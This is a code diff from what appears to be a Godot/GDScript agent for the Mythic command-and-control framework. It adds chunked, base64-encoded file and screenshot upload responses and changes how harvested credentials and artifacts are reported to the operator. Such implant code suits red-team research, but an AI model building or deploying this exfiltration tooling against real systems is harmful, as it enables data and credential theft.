@@ -56,61 +56,81 @@ func get_checkin_payload():
 func get_tasking_payload():
 	var payload = {
 		"action": "get_tasking",
-		"tasking_size": 1, # TODO: maths - calculate time between call and increase number by some amount?
+		"tasking_size": 2, # TODO: maths - calculate time between call and increase number by some amount?
 		"delegates": [],
 		"get_delegate_tasks": false,# no p2p for us at this time...
 	}
 
 	return to_json(payload)
 
-func create_task_response(status, completed, task_id, output, artifacts = [], credentials = []):
+func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, chunk_size, user_output, status):
+	var payload = {
+		"task_id": task_id,
+		"full_path": filepath,
+		"host": host,
+		"is_screenshot": is_screenshot,
+		"total_chunks": chunk_count,
+		"chunk_size": chunk_size,
+		"user_output": user_output,
+		"status": status
+	}
+
+	#return to_json(payload)
+	return payload
+
+func create_file_response_chunk(task_id, file_id, chunk_num, data):
+	var payload = {
+		"chunk_num": chunk_num, 
+		"file_id": file_id, 
+		"chunk_data": Marshalls.raw_to_base64(data),
+		"task_id": task_id
+	}
+
+	#return to_json(payload)
+	return payload
+
+func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], file_starts = [], file_chunks = []):
 	var payload = {
 		"action": "post_response",
 		"responses": [],
 	}
-	
+
 	var task_response = {
 		"task_id": task_id,
 		"user_output": output,
-		"artifacts": [],
 		"status": "error",
 		"completed": completed,
-		"credentials": credentials
 	}
 
-	if status:
-		task_response["status"] = "success"
+	if credentials.size() > 0:
+		task_response["credentials"] = credentials
+	
+	if artifacts.size() > 0:
+		task_response["artifacts"] = []
 
-	for artifact in artifacts:
-		var entry = {}
+		for artifact in artifacts:
+			var entry = {}
 
-		entry["base_artifact"] = artifact[0]
-		entry["artifact"] = artifact[1]
-		task_response["artifacts"].append(entry)
+			entry["base_artifact"] = artifact[0]
+			entry["artifact"] = artifact[1]
+			task_response["artifacts"].append(entry)
 
-	payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
+	for file_start in file_starts:
+		payload["responses"].append(file_start)
+	
+	for file_chunk in file_chunks:
+		payload["responses"].append(file_chunk)
 
-	print("returning payload from tasking: ", payload)
+	if credentials.size() > 0 or artifacts.size() > 0: # damn mythic...it'd be nice if you used a key for files...or didn't for these...be consistent ffs!
+
+		if status:
+			task_response["status"] = "success"
+
+		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
 
 	return to_json(payload)
 
-func create_credential_response(task_id, username, password, realm, message):
-	var payload = {
-		"task_id": task_id,
-		"user_output": message,
-		"credentials": [
-			{
-				"credential_type": "plaintext",
-				"realm": realm,
-				"credential": password,
-				"account": username,
-			}
-		]
-	}
-
-	return to_json(payload)
-
-func unwrap_payload(packet):	
+func unwrap_payload(packet):
 	var ret = {
 		"action": "",
 		"payload": "",
@@ -148,7 +168,7 @@ func wrap_payload(payload):
 	return payload
 
 func agent_response(payload):
-	print("response payload: ", payload)
+	print("sending payload: ", payload)
 
 	payload = wrap_payload(payload)
 
